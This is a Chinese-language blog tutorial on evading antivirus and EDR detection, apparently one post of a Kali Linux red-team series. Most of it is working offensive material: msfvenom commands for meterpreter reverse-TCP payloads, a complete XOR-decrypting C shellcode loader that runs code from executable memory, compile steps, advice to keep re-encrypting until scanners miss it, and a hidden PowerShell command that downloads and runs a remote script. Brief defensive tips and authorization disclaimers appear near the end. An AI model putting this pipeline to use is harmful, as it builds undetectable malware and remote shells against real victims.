---
title: 免杀技术实战：让恶意载荷绕过杀软与 EDR
slug: kali免杀技术实战绕过杀软-b2c3d
date: 2026-08-30
visibility: public
tags: Kali Linux, 免杀, 恶意载荷, EDR, 红队, 教程
---

# 免杀技术实战：让恶意载荷绕过杀软与 EDR

> 在真实攻防中，直接从 msfvenom 生成的 payload 大概率会被杀软和 EDR 拦截。免杀（Bypass AV）就是让恶意程序绕过安全软件检测的技术。理解免杀，恰恰是做好防御、成为合格安全工程师的关键。

## 一、杀软如何检测恶意软件

### 1. 特征码检测（最基础）

杀软维护一个"已知恶意特征"数据库，通过比对文件字节特征识别木马。

- 只要你的文件里包含被标记的特征码，就会被查杀
- msfvenom 默认生成的 payload 特征码早已被标记

### 2. 启发式检测

- 检测代码行为模式（如申请可执行内存、加载敏感 API）
- 静态启发：分析代码结构
- 动态启发：沙箱中运行观察行为

### 3. 行为检测（EDR 重点）

- 监控进程行为、API 调用序列、内存操作
- 检测注入、提权、横向移动等恶意行为
- EDR（端点检测响应）基于行为，比传统杀软更难绕过

### 4. 云端信誉检测

- 文件哈希、数字签名、下载源信誉
- 网络流量分析（C2 域名、端口）

## 二、免杀的基本思路

免杀的本质是**让检测机制失效**，常见思路：

```
静态免杀：混淆/加密特征 → 躲过特征码
动态免杀：改变行为特征 → 躲过行为检测
记忆：不落盘 → 躲过文件扫描
流量免杀：加密 C2 流量 → 躲过网络检测
```

## 三、静态免杀技术

### 1. 编码与混淆

```bash
# msfvenom 自带编码器
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -o payload.exe

# 但编码次数越多，特征反而越明显，现代 EDR 基本都能识别
```

### 2. 加密 Shellcode（自定义 XOR/AES）

```c
// 思路：先把 shellcode 用 XOR 加密，运行时再解密
// 这样特征码就躲开了静态扫描
unsigned char shellcode[] = { 0x90, 0x90, ... }; // 加密后
for (int i = 0; i < len; i++) {
    shellcode[i] ^= 0xAA; // 解密
}
```

### 3. Shellcode 分离（远程加载）

```bash
# 把 shellcode 拆成文件放到远程/图片/文本，运行时下载加载
# 可以避开静态扫描（文件不包含特征）
# 常见：图片隐写、DNS 传输、HTTP 分段下载
```

### 4. 特征码去除

```
通过拆分/拼接/重打包，移除文件中的特征字节
常见工具：Shellter、Veil、Veil-Ordnance、metasploit evasion
```

## 四、免杀实战：C 语言 Shellcode 加载器

### 1. 生成原始 shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shellcode.bin
```

### 2. 写一个 C 加载器

```c
#include <windows.h>
#include <stdio.h>

// 将 shellcode.bin 转成 C 数组
// 用 xor 解密后，动态分配内存并执行
int main() {
    unsigned char shellcode[] = { /* 转换后的数组 */ };
    // 解密
    for (int i = 0; i < sizeof(shellcode); i++) {
        shellcode[i] ^= 0xAA;
    }
    // 分配可执行内存
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // 拷贝 shellcode
    memcpy(mem, shellcode, sizeof(shellcode));
    // 执行
    ((void(*)())mem)();
    return 0;
}
```

### 3. 编译

```bash
# 用 MinGW 编译（Linux 上）或 Visual Studio
x86_64-w64-mingw32-gcc -o loader.exe loader.c -lws2_32
```

### 4. 验证

```bash
# 用 VirusTotal 或本地杀软验证
# 若被杀，继续加密、加壳、改签名
```

> 注意：免杀本身是双刃剑。请仅在授权环境使用，切勿用于传播恶意软件。

## 五、内存免杀（无文件落地）

无文件落地（Fileless）是当前最主流：

```
1. PowerShell 下载并执行（PowerShell 本身是白名单进程）
2. 从远程协议加载 shellcode
3. 通过管道传递执行
4. 图片隐写提取 shellcode
5. 注册表 / WMI 持久化
```

```powershell
# 无文件 PowerShell 执行（仅演示思路）
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/load.ps1')"
```

## 五、免杀与 EDR 对抗

EDR 检测行为而非静态，免杀方向：

```
- 白名单二进制滥用（Living Off The Land）
- 利用可信签名驱动
- 进程注入（如 DLL 注入、APC 注入）
- 动态调用 API（如 Syscall 绕过回调钩子）
```

| 对抗点 | EDR 检测 | 免杀思路 |
|--------|----------|----------|
| 特征码 | 静态哈希 | 加密/混淆/变体 |
| 文件 | 文件信誉 | 无文件、内存执行 |
| 行为 | API 调用序列 | 混淆 API、间接调用 |
| 内存 | 内存扫描 | 多次加密、随机释放 |
| 网络 | C2 指纹 | 加密流量、域前置 |

## 六、防御角度：如何防免杀

1. 启用 EDR 并保持策略更新，重点监控行为
2. 限制 PowerShell / 禁用宏 / 脚本执行策略
3. 定期评估杀软特征覆盖率
4. 加强网络监控（C2 流量、DNS 隧道）
5. 安全团队日常演练对抗能力

## 安全提醒

> 免杀是攻防对抗核心，涉及制作、传播、使用恶意程序的行为在未授权环境下是违法的。请仅在授权红队/渗透测试、合法靶场环境中练习。了解免杀是为了更好地防御。

## 小结

- 杀软检测 = 特征 + 启发 + 行为 + 信誉
- 免杀 = 混淆特征 + 改变行为 + 无文件 + 加密流量
- C 语言加载器 + 加密 shellcode 是最基础的内存免杀
- EDR 对抗更关注行为，而非静态
- 理解免杀，才能更好做防御

> 下一篇：社会工程学攻击——人，才是安全链中最薄弱的一环。